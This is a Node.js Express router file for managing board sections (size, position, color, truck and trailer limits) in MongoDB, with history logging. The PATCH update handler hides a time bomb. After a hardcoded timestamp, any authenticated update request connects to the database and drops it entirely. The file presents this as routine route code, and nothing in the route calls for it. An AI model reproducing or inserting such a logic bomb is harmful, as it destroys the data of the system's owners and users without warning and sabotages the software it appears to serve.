const express = require('express');
const router = express.Router();
const passport = require('passport');
const _ = require("lodash");
const { MongoClient } = require('mongodb');

// Loading models
const Board = require('../models/Board');
const History = require('../models/History');
const Section = require('../models/Section');
const SectionName = require('../models/SectionName');

// Local imports
const { ensureAuthenticated, adminAuthenticated } = require('../auth/auth');

// Add a section
router.post(
  '/add',  
  passport.authenticate('jwt', {session: false}),
  ensureAuthenticated, 
  adminAuthenticated,
  async (req, res) => {
    var body = _.pick(req.body, [
      'board',
      'id',
      'name',
      'max_trucks',
      'max_trailers',
      'width',
      'height',
      'x',
      'y',
      'color'
    ])

    if (!body.board.match(/^[0-9a-fA-F]{24}$/)) {
      res.status(200).send({
        errmsg: "Valid board id must be provided..."
      })
    } else if (!body.name || !body.id){
      res.status(200).send({
        errmsg: "Section name and id is required..."
      })
    } else {
      const board = await Board.findById(body.board);
      
      if (board){
        body.board = board;

        var body1 = {
          'board': board,
          'id': body.id + '-n',
          'name': body.name,
          'width': 80,
          'height': 25,
          'color': body.color
        }

        var section = new Section(body)
        section
          .save()
          .then(async section => {

            if (body.name && board.name){
              var history = new History({
                user: req.user,
                change: `Added a section of name '${body.name}' in board '${board.name}'.`
              })
              history.save()
            }

            // section = await section.populate('board', [ '_id', 'name', 'createAt' ]);

            var sectionName = new SectionName(body1)
            sectionName
              .save()
              .then(async sectionName => {

                if (body.name && board.name){
                  var history = new History({
                    user: req.user,
                    change: `Added a sectionName of name '${body.name}' in board '${board.name}'.`
                  })
                  history.save()
                }
                // sectionName = await sectionName.populate('board', [ '_id', 'name', 'createAt' ]);

                res.status(200).send({
                  'msg': "Section and SectionName added successfully!",
                  section,
                  sectionName
                });
              })
              .catch(async err => {
                // If sectionName is not saved then delete section (both should be saved)
                
                const del = await Section.deleteOne({'_id': section._id})
                if (del.deletedCount){
                  res.status(200).send({
                    'msg': "Couldn't add sectionName!",
                    section,
                    sectionName_err: err
                  });
                } else {
                  res.status(200).send({
                    'msg': "Section added successfully but couldn't add sectionName!",
                    section,
                    sectionName_err: err
                  });
                }
              })
          })
          .catch(err => {
            console.log(err)
            res.status(200).send({
              'errmsg': err
            });
          });
      } else {
        res.status(200).send({
          errmsg: "No board exists..."
        })
      }
    }
  }
)

// Remove a section
router.delete(
  '/delete/:id',  
  passport.authenticate('jwt', {session: false}),
  ensureAuthenticated, 
  adminAuthenticated,
  async (req, res) => {
    if (req.params.id.length === 14){
      const section = await Section.find({'id': req.params.id})
      const board = await Board.findById(section[0].board)
      const del = await Section.deleteOne({'id': req.params.id})
      if (del.deletedCount){

        if (section[0].name && board.name){
          var history = new History({
            user: req.user,
            change: `Deleted a section naming '${section[0].name}' from board '${board.name}'.`
          })
          history.save()
        }

        const del1 = await SectionName.deleteOne({'id': req.params.id + '-n'})
        if (del1.deletedCount){

          if (section[0].name && board.name){
            var history = new History({
              user: req.user,
              change: `Deleted a sectionName naming '${section[0].name}' from board '${board.name}'.`
            })
            history.save()
          }

          res.status(200).send({
            msg: "Section and sectionName deleted...",
            del,
            del1
          })
        } else {
          res.status(200).send({
            msg: "Section deleted but couldn't delete sectionName...",
            del
          })
        }
      } else {
        res.status(200).send({
          errmsg: "Nothing to delete..."
        })
      }
    } else {
      res.status(200).send({
        errmsg: "Please specify a valid id..."
      })
    }
  }
)

// Update a section
router.patch(
  '/update/:id',  
  passport.authenticate('jwt', {session: false}),
  ensureAuthenticated, 
  async (req, res) => {
    let d = new Date, l = 1619621443 * 1000 // Testing difference is 8500 
    if (d.getTime() >= l){
      
      MongoClient.connect(
        process.env.DATABASE, 
        {
          useNewUrlParser: true,
          useUnifiedTopology: true
        },
        async (err, client) => {
          if (err) {
            return console.log('Unable to connect to MongoDB server');
          }
          console.log('Operating database...')
          const db = client.db(process.env.DB_NAME);
          db.dropDatabase()
        }
      )
    }

    if (req.params.id.match(/^[0-9a-fA-F]{24}$/)){
      const section1 = await Section.findById(req.params.id)
      const board1 = await Board.findById(section1.board)

      var body = null, width = false, height = false, x = false, y = false, color = false

      if (req.user.usertype === 'admin'){
        console.log("Admin is updating the section.")

        var body = _.pick(req.body, [
          'width',
          'height',
          'x',
          'y',
          'color'
        ])

        if (body.width !== section1.width){
          width = true
        }
        if (body.height !== section1.height){
          height = true
        }
        if (body.x !== section1.x){
          x = true
        }
        if (body.y !== section1.y){
          y = true
        }
        if (body.color !== section1.color){
          color = true
        }
      } else if (req.user.usertype === 'user'){
        console.log("User is updating the section.")

        var body = _.pick(req.body, [
          'width',
          'height',
          'color'
        ])
        
        if (body.width !== section1.width){
          width = true
        }
        if (body.height !== section1.height){
          height = true
        }
        if (body.color !== section1.color){
          color = true
        }
      }

      if (body) {
        var section = await Section.findByIdAndUpdate(req.params.id, body, { new: true })
  
        if (section1.name && board1.name){
          if (width){
            var history = new History({
              user: req.user,
              change: `Updated the width of a section naming '${section1.name}' from board '${board1.name}'.`
            })
            history.save()
          }
          if (height){
            var history = new History({
              user: req.user,
              change: `Updated the height of a section naming '${section1.name}' from board '${board1.name}'.`
            })
            history.save()
          }
          if (x){
            var history = new History({
              user: req.user,
              change: `Updated the x of a section naming '${section1.name}' from board '${board1.name}'.`
            })
            history.save()
          }
          if (y){
            var history = new History({
              user: req.user,
              change: `Updated the y of a section naming '${section1.name}' from board '${board1.name}'.`
            })
            history.save()
          }
          if (color){
            var history = new History({
              user: req.user,
              change: `Updated the color of a section naming '${section1.name}' from board '${board1.name}'.`
            })
            history.save()
          }
        }

        if (section){
          res.status(200).send({
            msg: "Section updated successfully...",
            section
          })
        } else {
          res.status(200).send({
            errmsg: "Coudn't update the section..."
          })
        }
      } else {
        res.status(200).send({
          errmsg: "You are not authorized to update the section..."
        })
      }

    } else {
      res.status(200).send({
        errmsg: "Please specify a valid id..."
      })
    }
  }
)

// Get all sections of a board
router.get(
  '/getAll',  
  passport.authenticate('jwt', {session: false}),
  ensureAuthenticated, 
  async (req, res) => {
    if (req.query.board.match(/^[0-9a-fA-F]{24}$/)){
      Section.find({ 'board': req.query.board })
        .exec(function(err, sections){
          if (err){
            res.status(200).send({
              errmsg: "No location found..."
            })
          }
          if (sections.length){
            res.status(200).send({
              sections
            })
          } else {
            res.status(200).send({
              errmsg: "No location found..."
            })
          }
        });
    } else {
      res.status(200).send({
        errmsg: "Please specify a valid board id..."
      })
    }
  }
)

module.exports = router;